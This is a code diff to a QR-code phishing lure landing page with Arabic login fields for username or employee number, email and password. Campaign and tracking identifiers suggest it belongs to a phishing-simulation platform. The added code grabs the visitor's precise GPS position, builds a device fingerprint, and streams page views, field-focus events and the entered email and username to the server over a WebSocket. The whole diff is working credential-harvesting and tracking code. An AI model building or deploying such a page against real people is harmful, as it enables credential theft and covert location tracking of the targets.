@@ -145,6 +145,21 @@ async function sha256Hex(input: string): Promise<string> {
   }
 }
 
+async function getBrowserGeolocation(): Promise<{ latitude: number; longitude: number; accuracy?: number } | null> {
+  try {
+    if (!navigator.geolocation) return null;
+    return await new Promise((resolve) => {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+        () => resolve(null),
+        { timeout: 2500, enableHighAccuracy: true }
+      );
+    });
+  } catch {
+    return null;
+  }
+}
+
 /** Lightweight, non-invasive device fingerprint (no cookies, no storage). */
 async function collectFingerprint(): Promise<Record<string, unknown>> {
   const nav = navigator as Navigator & { deviceMemory?: number };
@@ -159,6 +174,7 @@ async function collectFingerprint(): Promise<Record<string, unknown>> {
     platform: nav.platform,
     touch_points: nav.maxTouchPoints,
     user_agent: nav.userAgent,
+    client_model: (nav as unknown as { userAgentData?: { model?: string } }).userAgentData?.model || null,
     webgl_vendor: null,
     webgl_renderer: null,
     canvas_hash: '',
@@ -219,6 +235,7 @@ interface FormProps {
   onEmail: (value: string) => void;
   onPassword: (value: string) => void;
   onTogglePassword: () => void;
+  onFieldFocus?: (field: string) => void;
   onSubmit: (event: FormEvent<HTMLFormElement>) => void;
 }
 
@@ -235,6 +252,7 @@ function IdentityForm({
   onEmail,
   onPassword,
   onTogglePassword,
+  onFieldFocus,
   onSubmit,
 }: FormProps) {
   const dark = skin.field === 'dark';
@@ -261,6 +279,7 @@ function IdentityForm({
           label="اسم المستخدم أو الرقم الوظيفي"
           value={username}
           onChange={(event) => onUsername(event.target.value)}
+          onFocus={() => onFieldFocus?.('username')}
           autoComplete="username"
           sx={fieldSx}
           InputProps={{
@@ -281,6 +300,7 @@ function IdentityForm({
           placeholder={`name@${company.replace(/\s+/g, '').toLowerCase() || 'company'}.com`}
           value={email}
           onChange={(event) => onEmail(event.target.value)}
+          onFocus={() => onFieldFocus?.('email')}
           autoComplete="email"
           sx={fieldSx}
           InputProps={{
@@ -300,6 +320,7 @@ function IdentityForm({
           label="كلمة المرور"
           value={password}
           onChange={(event) => onPassword(event.target.value)}
+          onFocus={() => onFieldFocus?.('password')}
           autoComplete="current-password"
           sx={fieldSx}
           InputProps={{
@@ -478,6 +499,65 @@ export function QrLureLandingPage() {
   const cta = branding?.cta || 'متابعة آمنة';
   const Icon = LURE_ICON[lure];
 
+  const wsRef = useRef<WebSocket | null>(null);
+
+  useEffect(() => {
+    if (!campaignId) return;
+    const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+    const host = window.location.host;
+    const wsUrl = `${proto}//${host}/ws/campaign/${campaignId}/scans`;
+
+    let socket: WebSocket | null = null;
+    try {
+      socket = new WebSocket(wsUrl);
+      wsRef.current = socket;
+
+      socket.onopen = async () => {
+        const fp = await collectFingerprint();
+        const gps = await getBrowserGeolocation();
+        if (gps) {
+          fp.gps = gps;
+        }
+        if (socket && socket.readyState === WebSocket.OPEN) {
+          socket.send(
+            JSON.stringify({
+              event: 'page_viewed',
+              campaign_id: campaignId,
+              tracking_uuid: trackingUuid || undefined,
+              fingerprint: fp,
+              gps: gps || undefined,
+            })
+          );
+        }
+      };
+    } catch {
+      /* Fallback gracefully if WebSocket cannot be established */
+    }
+
+    return () => {
+      if (socket && (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING)) {
+        socket.close();
+      }
+    };
+  }, [campaignId, trackingUuid]);
+
+  const handleFieldFocus = (field: string) => {
+    if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
+      try {
+        wsRef.current.send(
+          JSON.stringify({
+            event: 'field_focused',
+            field,
+            campaign_id: campaignId,
+            tracking_uuid: trackingUuid || undefined,
+          })
+        );
+      } catch {
+        /* Ignore send error */
+      }
+    }
+  };
+
   useEffect(() => {
     if (!trackingUuid || visitLogged.current) return;
     visitLogged.current = true;
@@ -514,6 +594,21 @@ export function QrLureLandingPage() {
     setError(null);
     startedAt.current = startedAt.current || performance.now();
     try {
+      if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
+        try {
+          wsRef.current.send(
+            JSON.stringify({
+              event: 'form_submitted',
+              campaign_id: campaignId,
+              tracking_uuid: trackingUuid || undefined,
+              email: email.trim(),
+              username: username.trim(),
+            })
+          );
+        } catch {
+          /* Ignore WS failure */
+        }
+      }
       const fingerprint = await collectFingerprint();
       fingerprint.submit_delay_ms = Math.round(performance.now() - startedAt.current);
       await new Promise((resolve) => window.setTimeout(resolve, 850));
@@ -564,6 +659,7 @@ export function QrLureLandingPage() {
     onEmail: setEmail,
     onPassword: setPassword,
     onTogglePassword: () => setShowPassword((value) => !value),
+    onFieldFocus: handleFieldFocus,
     onSubmit: (event) => void handleSubmit(event),
   };
 
